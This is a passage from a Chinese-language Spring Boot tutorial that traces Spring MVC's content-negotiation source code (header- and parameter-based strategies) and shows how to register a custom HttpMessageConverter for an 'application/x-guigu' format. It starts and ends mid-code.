List&lt;MediaType&gt; acceptableTypes = getAcceptableMediaTypes(request);<br>                <span class="hljs-comment">//服务器最终根据自己自身的能力，决定服务器能生产出什么样内容类型的数据</span><br>                List&lt;MediaType&gt; producibleTypes = getProducibleMediaTypes(request, valueType, targetType);<br><br>                <span class="hljs-keyword">if</span> (body != <span class="hljs-literal">null</span> &amp;&amp; producibleTypes.isEmpty()) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpMessageNotWritableException</span>(<br>                            <span class="hljs-string">&quot;No converter found for return value of type: &quot;</span> + valueType);<br>                &#125;<br>                List&lt;MediaType&gt; mediaTypesToUse = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>                <span class="hljs-keyword">for</span> (MediaType requestedType : acceptableTypes) &#123;<br>                    <span class="hljs-keyword">for</span> (MediaType producibleType : producibleTypes) &#123;<br>                        <span class="hljs-keyword">if</span> (requestedType.isCompatibleWith(producibleType)) &#123;<br>                            mediaTypesToUse.add(getMostSpecificMediaType(requestedType, producibleType));<br>                        &#125;<br>                    &#125;<br>                &#125;<br>                <span class="hljs-keyword">if</span> (mediaTypesToUse.isEmpty()) &#123;<br>                    <span class="hljs-keyword">if</span> (body != <span class="hljs-literal">null</span>) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpMediaTypeNotAcceptableException</span>(producibleTypes);<br>                    &#125;<br>                    <span class="hljs-keyword">if</span> (logger.isDebugEnabled()) &#123;<br>                        logger.debug(<span class="hljs-string">&quot;No match for &quot;</span> + acceptableTypes + <span class="hljs-string">&quot;, supported: &quot;</span> + producibleTypes);<br>                    &#125;<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br><br>                MediaType.sortBySpecificityAndQuality(mediaTypesToUse);<br><br>                <span class="hljs-comment">//选择一个MediaType</span><br>                <span class="hljs-keyword">for</span> (MediaType mediaType : mediaTypesToUse) &#123;<br>                    <span class="hljs-keyword">if</span> (mediaType.isConcrete()) &#123;<br>                        selectedMediaType = mediaType;<br>                        <span class="hljs-keyword">break</span>;<br>                    &#125;<br>                    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (mediaType.isPresentIn(ALL_APPLICATION_MEDIA_TYPES)) &#123;<br>                        selectedMediaType = MediaType.APPLICATION_OCTET_STREAM;<br>                        <span class="hljs-keyword">break</span>;<br>                    &#125;<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (logger.isDebugEnabled()) &#123;<br>                    logger.debug(<span class="hljs-string">&quot;Using &#x27;&quot;</span> + selectedMediaType + <span class="hljs-string">&quot;&#x27;, given &quot;</span> +<br>                            acceptableTypes + <span class="hljs-string">&quot; and supported &quot;</span> + producibleTypes);<br>                &#125;<br>            &#125;<br><br>        <br>            <span class="hljs-keyword">if</span> (selectedMediaType != <span class="hljs-literal">null</span>) &#123;<br>                selectedMediaType = selectedMediaType.removeQualityValue();<br>                <span class="hljs-comment">//本节主角：HttpMessageConverter</span><br>                <span class="hljs-keyword">for</span> (HttpMessageConverter&lt;?&gt; converter : <span class="hljs-built_in">this</span>.messageConverters) &#123;<br>                    <span class="hljs-type">GenericHttpMessageConverter</span> <span class="hljs-variable">genericConverter</span> <span class="hljs-operator">=</span> (converter <span class="hljs-keyword">instanceof</span> GenericHttpMessageConverter ?<br>                            (GenericHttpMessageConverter&lt;?&gt;) converter : <span class="hljs-literal">null</span>);<br>                    <br>                    <span class="hljs-comment">//判断是否可写</span><br>                    <span class="hljs-keyword">if</span> (genericConverter != <span class="hljs-literal">null</span> ?<br>                            ((GenericHttpMessageConverter) converter).canWrite(targetType, valueType, selectedMediaType) :<br>                            converter.canWrite(valueType, selectedMediaType)) &#123;<br>                        body = getAdvice().beforeBodyWrite(body, returnType, selectedMediaType,<br>                                (Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpMessageConverter</span>&lt;?&gt;&gt;) converter.getClass(),<br>                                inputMessage, outputMessage);<br>                        <span class="hljs-keyword">if</span> (body != <span class="hljs-literal">null</span>) &#123;<br>                            <span class="hljs-type">Object</span> <span class="hljs-variable">theBody</span> <span class="hljs-operator">=</span> body;<br>                            LogFormatUtils.traceDebug(logger, traceOn -&gt;<br>                                    <span class="hljs-string">&quot;Writing [&quot;</span> + LogFormatUtils.formatValue(theBody, !traceOn) + <span class="hljs-string">&quot;]&quot;</span>);<br>                            addContentDispositionHeader(inputMessage, outputMessage);<br><span class="hljs-comment">//开始写入</span><br>                            <span class="hljs-keyword">if</span> (genericConverter != <span class="hljs-literal">null</span>) &#123;<br>                                genericConverter.write(body, targetType, selectedMediaType, outputMessage);<br>                            &#125;<br>                            <span class="hljs-keyword">else</span> &#123;<br>                                ((HttpMessageConverter) converter).write(body, selectedMediaType, outputMessage);<br>                            &#125;<br>                        &#125;<br>                        <span class="hljs-keyword">else</span> &#123;<br>                            <span class="hljs-keyword">if</span> (logger.isDebugEnabled()) &#123;<br>                                logger.debug(<span class="hljs-string">&quot;Nothing to write: null body&quot;</span>);<br>                            &#125;<br>                        &#125;<br>                        <span class="hljs-keyword">return</span>;<br>                    &#125;<br>                &#125;<br>            &#125;<br>...<br>        &#125;<br></code></pre></td></tr></table></figure><h2 id="40、响应处理-【源码分析】-基于请求参数的内容协商原理"><a href="#40、响应处理-【源码分析】-基于请求参数的内容协商原理" class="headerlink" title="40、响应处理-【源码分析】-基于请求参数的内容协商原理"></a>40、响应处理-【源码分析】-基于请求参数的内容协商原理</h2><p>上一节内容协商原理的第二步：</p><p>获取客户端（PostMan、浏览器）支持接收的内容类型。（获取客户端Accept请求头字段application&#x2F;xml）</p><ul><li><code>contentNegotiationManager</code> 内容协商管理器 默认使用基于请求头的策略</li><li><code>HeaderContentNegotiationStrategy</code>  确定客户端可以接收的内容类型</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//RequestResponseBodyMethodProcessor继承这类</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AbstractMessageConverterMethodProcessor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractMessageConverterMethodArgumentResolver</span><br><span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerMethodReturnValueHandler</span> &#123;<br><br>    ...<br>    <br>    <span class="hljs-comment">//跟上一节的代码一致</span><br>    <span class="hljs-keyword">protected</span> &lt;T&gt; <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeWithMessageConverters</span><span class="hljs-params">(<span class="hljs-meta">@Nullable</span> T value, MethodParameter returnType,</span><br><span class="hljs-params">                ServletServerHttpRequest inputMessage, ServletServerHttpResponse outputMessage)</span><br>                <span class="hljs-keyword">throws</span> IOException, HttpMediaTypeNotAcceptableException, HttpMessageNotWritableException &#123;<br><br>            Object body;<br>            Class&lt;?&gt; valueType;<br>            Type targetType;<br>        <br>        ...<br>        <br>                    <span class="hljs-comment">//本节重点</span><br>            <span class="hljs-comment">//内容协商（浏览器默认会以请求头(参数Accept)的方式告诉服务器他能接受什么样的内容类型）</span><br>            <span class="hljs-type">MediaType</span> <span class="hljs-variable">selectedMediaType</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>            <span class="hljs-type">MediaType</span> <span class="hljs-variable">contentType</span> <span class="hljs-operator">=</span> outputMessage.getHeaders().getContentType();<br>            <span class="hljs-type">boolean</span> <span class="hljs-variable">isContentTypePreset</span> <span class="hljs-operator">=</span> contentType != <span class="hljs-literal">null</span> &amp;&amp; contentType.isConcrete();<br>            <span class="hljs-keyword">if</span> (isContentTypePreset) &#123;<br>                <span class="hljs-keyword">if</span> (logger.isDebugEnabled()) &#123;<br>                    logger.debug(<span class="hljs-string">&quot;Found &#x27;Content-Type:&quot;</span> + contentType + <span class="hljs-string">&quot;&#x27; in response&quot;</span>);<br>                &#125;<br>                selectedMediaType = contentType;<br>            &#125;<br>            <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> inputMessage.getServletRequest();<br>                List&lt;MediaType&gt; acceptableTypes = getAcceptableMediaTypes(request);<br>                <span class="hljs-comment">//服务器最终根据自己自身的能力，决定服务器能生产出什么样内容类型的数据</span><br>                List&lt;MediaType&gt; producibleTypes = getProducibleMediaTypes(request, valueType, targetType);<br>            ...<br>            <br>&#125;<br>    <br>    <span class="hljs-comment">//在AbstractMessageConverterMethodArgumentResolver类内</span><br>   <span class="hljs-keyword">private</span> List&lt;MediaType&gt; <span class="hljs-title function_">getAcceptableMediaTypes</span><span class="hljs-params">(HttpServletRequest request)</span><br><span class="hljs-keyword">throws</span> HttpMediaTypeNotAcceptableException &#123;<br><br>        <span class="hljs-comment">//内容协商管理器 默认使用基于请求头的策略</span><br><span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.contentNegotiationManager.resolveMediaTypes(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletWebRequest</span>(request));<br>&#125;<br>        <br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ContentNegotiationManager</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ContentNegotiationStrategy</span>, MediaTypeFileExtensionResolver &#123;<br><br>    ...<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ContentNegotiationManager</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-built_in">this</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HeaderContentNegotiationStrategy</span>());<span class="hljs-comment">//内容协商管理器 默认使用基于请求头的策略</span><br>&#125;<br>    <br>    <span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> List&lt;MediaType&gt; <span class="hljs-title function_">resolveMediaTypes</span><span class="hljs-params">(NativeWebRequest request)</span> <span class="hljs-keyword">throws</span> HttpMediaTypeNotAcceptableException &#123;<br><span class="hljs-keyword">for</span> (ContentNegotiationStrategy strategy : <span class="hljs-built_in">this</span>.strategies) &#123;<br>List&lt;MediaType&gt; mediaTypes = strategy.resolveMediaTypes(request);<br><span class="hljs-keyword">if</span> (mediaTypes.equals(MEDIA_TYPE_ALL_LIST)) &#123;<br><span class="hljs-keyword">continue</span>;<br>&#125;<br><span class="hljs-keyword">return</span> mediaTypes;<br>&#125;<br><span class="hljs-keyword">return</span> MEDIA_TYPE_ALL_LIST;<br>&#125;<br>    ...<br>    <br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//基于请求头的策略</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HeaderContentNegotiationStrategy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ContentNegotiationStrategy</span> &#123;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * &#123;<span class="hljs-doctag">@inheritDoc</span>&#125;</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> HttpMediaTypeNotAcceptableException if the &#x27;Accept&#x27; header cannot be parsed</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> List&lt;MediaType&gt; <span class="hljs-title function_">resolveMediaTypes</span><span class="hljs-params">(NativeWebRequest request)</span><br><span class="hljs-keyword">throws</span> HttpMediaTypeNotAcceptableException &#123;<br><br>String[] headerValueArray = request.getHeaderValues(HttpHeaders.ACCEPT);<br><span class="hljs-keyword">if</span> (headerValueArray == <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">return</span> MEDIA_TYPE_ALL_LIST;<br>&#125;<br><br>List&lt;String&gt; headerValues = Arrays.asList(headerValueArray);<br><span class="hljs-keyword">try</span> &#123;<br>List&lt;MediaType&gt; mediaTypes = MediaType.parseMediaTypes(headerValues);<br>MediaType.sortBySpecificityAndQuality(mediaTypes);<br><span class="hljs-keyword">return</span> !CollectionUtils.isEmpty(mediaTypes) ? mediaTypes : MEDIA_TYPE_ALL_LIST;<br>&#125;<br><span class="hljs-keyword">catch</span> (InvalidMediaTypeException ex) &#123;<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpMediaTypeNotAcceptableException</span>(<br><span class="hljs-string">&quot;Could not parse &#x27;Accept&#x27; header &quot;</span> + headerValues + <span class="hljs-string">&quot;: &quot;</span> + ex.getMessage());<br>&#125;<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="开启浏览器参数方式内容协商功能"><a href="#开启浏览器参数方式内容协商功能" class="headerlink" title="开启浏览器参数方式内容协商功能"></a>开启浏览器参数方式内容协商功能</h3><p>为了方便内容协商，开启基于请求参数的内容协商功能。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">spring:</span><br>  <span class="hljs-attr">mvc:</span><br>    <span class="hljs-attr">contentnegotiation:</span><br>      <span class="hljs-attr">favor-parameter:</span> <span class="hljs-literal">true</span>  <span class="hljs-comment">#开启请求参数内容协商模式</span><br></code></pre></td></tr></table></figure><p>内容协商管理器，就会多了一个<code>ParameterContentNegotiationStrategy</code>（由Spring容器注入）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ParameterContentNegotiationStrategy</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractMappingContentNegotiationStrategy</span> &#123;<br><br><span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">parameterName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;format&quot;</span>;<span class="hljs-comment">//</span><br><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Create an instance with the given map of file extensions and media types.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">ParameterContentNegotiationStrategy</span><span class="hljs-params">(Map&lt;String, MediaType&gt; mediaTypes)</span> &#123;<br><span class="hljs-built_in">super</span>(mediaTypes);<br>&#125;<br><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Set the name of the parameter to use to determine requested media types.</span><br><span class="hljs-comment"> * &lt;p&gt;By default this is set to &#123;<span class="hljs-doctag">@code</span> &quot;format&quot;&#125;.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setParameterName</span><span class="hljs-params">(String parameterName)</span> &#123;<br>Assert.notNull(parameterName, <span class="hljs-string">&quot;&#x27;parameterName&#x27; is required&quot;</span>);<br><span class="hljs-built_in">this</span>.parameterName = parameterName;<br>&#125;<br><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">getParameterName</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.parameterName;<br>&#125;<br><br><br><span class="hljs-meta">@Override</span><br><span class="hljs-meta">@Nullable</span><br><span class="hljs-keyword">protected</span> String <span class="hljs-title function_">getMediaTypeKey</span><span class="hljs-params">(NativeWebRequest request)</span> &#123;<br><span class="hljs-keyword">return</span> request.getParameter(getParameterName());<br>&#125;<br>    <br>    <span class="hljs-comment">//---以下方法在AbstractMappingContentNegotiationStrategy类</span><br>    <br>    <span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> List&lt;MediaType&gt; <span class="hljs-title function_">resolveMediaTypes</span><span class="hljs-params">(NativeWebRequest webRequest)</span><br><span class="hljs-keyword">throws</span> HttpMediaTypeNotAcceptableException &#123;<br><br><span class="hljs-keyword">return</span> resolveMediaTypeKey(webRequest, getMediaTypeKey(webRequest));<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * An alternative to &#123;<span class="hljs-doctag">@link</span> #resolveMediaTypes(NativeWebRequest)&#125; that accepts</span><br><span class="hljs-comment"> * an already extracted key.</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@since</span> 3.2.16</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> List&lt;MediaType&gt; <span class="hljs-title function_">resolveMediaTypeKey</span><span class="hljs-params">(NativeWebRequest webRequest, <span class="hljs-meta">@Nullable</span> String key)</span><br><span class="hljs-keyword">throws</span> HttpMediaTypeNotAcceptableException &#123;<br><br><span class="hljs-keyword">if</span> (StringUtils.hasText(key)) &#123;<br><span class="hljs-type">MediaType</span> <span class="hljs-variable">mediaType</span> <span class="hljs-operator">=</span> lookupMediaType(key);<br><span class="hljs-keyword">if</span> (mediaType != <span class="hljs-literal">null</span>) &#123;<br>handleMatch(key, mediaType);<br><span class="hljs-keyword">return</span> Collections.singletonList(mediaType);<br>&#125;<br>mediaType = handleNoMatch(webRequest, key);<br><span class="hljs-keyword">if</span> (mediaType != <span class="hljs-literal">null</span>) &#123;<br>addMapping(key, mediaType);<br><span class="hljs-keyword">return</span> Collections.singletonList(mediaType);<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> MEDIA_TYPE_ALL_LIST;<br>&#125;<br>    <br><br>&#125;<br></code></pre></td></tr></table></figure><p>然后，浏览器地址输入带format参数的URL：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">8080</span><span class="hljs-regexp">/test/</span>person?format=json<br>或<br>http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">8080</span><span class="hljs-regexp">/test/</span>person?format=xml<br></code></pre></td></tr></table></figure><p>这样，后端会根据参数format的值，返回对应json或xml格式的数据。</p><h2 id="41、响应处理-【源码分析】-自定义MessageConverter"><a href="#41、响应处理-【源码分析】-自定义MessageConverter" class="headerlink" title="41、响应处理-【源码分析】-自定义MessageConverter"></a>41、响应处理-【源码分析】-自定义MessageConverter</h2><p><strong>实现多协议数据兼容。json、xml、x-guigu</strong>（这个是自创的）</p><ol><li><p><code>@ResponseBody</code> 响应数据出去 调用 <code>RequestResponseBodyMethodProcessor</code> 处理</p></li><li><p>Processor 处理方法返回值。通过 <code>MessageConverter</code>处理</p></li><li><p>所有 <code>MessageConverter</code> 合起来可以支持各种媒体类型数据的操作（读、写）</p></li><li><p>内容协商找到最终的 <code>messageConverter</code></p></li></ol><p>SpringMVC的什么功能，一个入口给容器中添加一个  <code>WebMvcConfigurer</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration(proxyBeanMethods = false)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WebConfig</span> &#123;<br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> WebMvcConfigurer <span class="hljs-title function_">webMvcConfigurer</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebMvcConfigurer</span>() &#123;<br><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">extendMessageConverters</span><span class="hljs-params">(List&lt;HttpMessageConverter&lt;?&gt;&gt; converters)</span> &#123;<br>                converters.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">GuiguMessageConverter</span>());<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 自定义的Converter</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GuiguMessageConverter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HttpMessageConverter</span>&lt;Person&gt; &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">canRead</span><span class="hljs-params">(Class&lt;?&gt; clazz, MediaType mediaType)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">canWrite</span><span class="hljs-params">(Class&lt;?&gt; clazz, MediaType mediaType)</span> &#123;<br>        <span class="hljs-keyword">return</span> clazz.isAssignableFrom(Person.class);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 服务器要统计所有MessageConverter都能写出哪些内容类型</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * application/x-guigu</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> List&lt;MediaType&gt; <span class="hljs-title function_">getSupportedMediaTypes</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> MediaType.parseMediaTypes(<span class="hljs-string">&quot;application/x-guigu&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Person <span class="hljs-title function_">read</span><span class="hljs-params">(Class&lt;? extends Person&gt; clazz, HttpInputMessage inputMessage)</span> <span class="hljs-keyword">throws</span> IOException, HttpMessageNotReadableException &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">write</span><span class="hljs-params">(Person person, MediaType contentType, HttpOutputMessage outputMessage)</span> <span class="hljs-keyword">throws</span> IOException, HttpMessageNotWritableException &#123;<br>        <span class="hljs-comment">//自定义协议数据的写出</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> person.getUserName()+<span class="hljs-string">&quot;;&quot;</span>+person.getAge()+<span class="hljs-string">&quot;;&quot;</span>+person.getBirth();<br><br><br>        <span class="hljs-comment">//写出去</span><br>        <span class="hljs-type">OutputStream</span> <span class="hljs-variable">body</span> <span class="hljs-operator">=</span> outputMessage.getBody();<br>        body.write(data.getBytes());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Date;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ResponseTestController</span> &#123;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 1、浏览器发请求直接返回 xml    [application/xml]        jacksonXmlConverter</span><br><span class="hljs-comment">     * 2、如果是ajax请求 返回 json   [application/json]      jacksonJsonConverter</span><br><span class="hljs-comment">     * 3、如果硅谷app发请求，返回自定义协议数据  [appliaction/x-guigu]   xxxxConverter</span><br><span class="hljs-comment">     *          属性值1;属性值2;</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * 步骤：</span><br><span class="hljs-comment">     * 1、添加自定义的MessageConverter进系统底层</span><br><span class="hljs-comment">     * 2、系统底层就会统计出所有MessageConverter能操作哪些类型</span><br><span class="hljs-comment">     * 3、客户端内容协商 [guigu---&gt;guigu]</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * 作业：如何以参数的方式进行内容协商</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@ResponseBody</span>  <span class="hljs-comment">//利用返回值处理器里面的消息转换器进行处理</span><br>    <span class="hljs-meta">@GetMapping(value 